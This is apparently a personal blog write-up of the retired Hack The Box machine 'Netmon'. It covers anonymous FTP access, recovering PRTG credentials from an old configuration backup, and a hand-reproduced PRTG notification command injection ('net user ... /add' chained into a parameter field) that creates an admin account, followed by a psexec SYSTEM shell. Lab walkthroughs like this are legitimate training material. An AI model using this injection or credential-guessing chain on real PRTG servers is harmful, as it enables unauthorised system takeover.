---
layout: post
title: "Netmon"
categories: HTB-Walkthrough
---

![netmon](/assets/img/netmon/netmon1.png)


Netmon is another retired HTB box from TJNull's 'more challenging than OSCP' list.


nmap first:

```
nmap -sV -Pn -sC 10.10.10.152 |tee -a netmon.txt
```

![nmap](/assets/img/netmon/netmon-nmap.png)


<hr width="300" size="8">


<h3>FTP</h3>

The `ftp` service accepts `anonymous` logins!

we are easily able to navigate to the user flag, and retrieve it!!!

```
ftp 10.10.10.152

Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
02-25-19  11:49PM       <DIR>          Windows
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-25-19  11:44PM       <DIR>          Administrator
02-03-19  12:35AM       <DIR>          Public
226 Transfer complete.
ftp> cd public
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  08:05AM       <DIR>          Documents
07-16-16  09:18AM       <DIR>          Downloads
07-16-16  09:18AM       <DIR>          Music
07-16-16  09:18AM       <DIR>          Pictures
02-03-19  12:35AM                   33 user.txt
07-16-16  09:18AM       <DIR>          Videos
226 Transfer complete.

ftp> get user.txt
local: user.txt remote: user.txt
200 PORT command successful.
150 Opening ASCII mode data connection.
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
33 bytes received in 0.10 secs (0.3180 kB/s)
ftp> exit
221 Goodbye.

```

Check the length of user.txt to see if it transfered correctly.
```
wc -c user.txt
33 user.txt
```

Same size as the file on the target, likely to be ok.
We may return to this service to explore some more, but I want to check out the web service.



<hr width="300" size="8">



![web](/assets/img/netmon/netmon-web1.png)


Im unfamiliar with PRTG Network Monitor, so I Google it and get to the vendor's website.

Exploring the system via Ftp again, and browse through the program's files for anything helpful.

Nothing immediately springs to my attention.

Browsing the vendor's website again I find where the really interesting files are hidden.

```
https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data
```

![progdata](/assets/img/netmon/netmon-datadir.png)


`facepalm`



Back in via FTP I recover some interesting files.

Examining the backup file 'PRTG Configuration.old.bak' reveals some db creds.

![dbcreds](/assets/img/netmon/netmon-dbcreds.png)



```
 User: prtgadmin
 Pass: PrTg@dmin2018
```

The creds fail, but since this is an old backup, perhaps the user has updated the password..

`pass: PrTg@dmin2019` works!




<hr width="300" size="8">



![dashboard](/assets/img/netmon/netmon-dashboard.png)



<hr width="300" size="8">




<h3>Searchsploit</h3>

There may be public exploits for this software, searchsploit is a good place to start looking.

```
searchsploit prtg
```

![searchsploit](/assets/img/netmon/netmon-searchsploit-prtg.png)


Since we have authenticated access, I check out the RCE exploit first.

```
searchsploit -m 46527
```

Examining the exploit, it looks like it creates or edits a notification, and executes a command to create an user with admin privileges.

The exploit doesnt seem to work for me out of the box, so instead of trying to fix it I attempt to follow it and replicate it manually.

I find the `notifications` table:

![notify](/assets/img/netmon/netmon-notifications.png)


Click the plus icon to add

Scroll to the bottom and select `Execute Program`

Use the dropdown arrow in the 'Program File' field to select `Demo exe notification-outfile.ps1`

Add the command to the 'Parameter' field below it:
```
test.txt;net user sh1n0bi pass123 /add;net localgroup administrators sh1n0bi /add
```



![adduser](/assets/img/netmon/netmon-exploit.png)


Click `Save`

The notification is added to the table.


To trigger the exploit, select the notification with the checkbox on the right, and click the bell icon (test) that appears on a blue panel.

![trigger](/assets/img/netmon/netmon-trigger.png)



<hr width="300" size="8">


We know that `smb` is running, possibly [Impacket's psexec.py](https://github.com/SecureAuthCorp/impacket) can give us an easy access.

```
python /opt/impacket/examples/psexec.py 'sh1n0bi:pass123@10.10.10.152'
```

![system-shell](/assets/img/netmon/netmon-system-shell.png)


With a SYSTEM shell, we can pick up the flags.

```
c:\Users\Public>type user.txt
ddxxxxxxxxxxxxxxxxxxxxxxxxxxxxa5


c:\Users\Administrator\Desktop>type root.txt
30xxxxxxxxxxxxxxxxxxxxxxxxxxxxcc
```
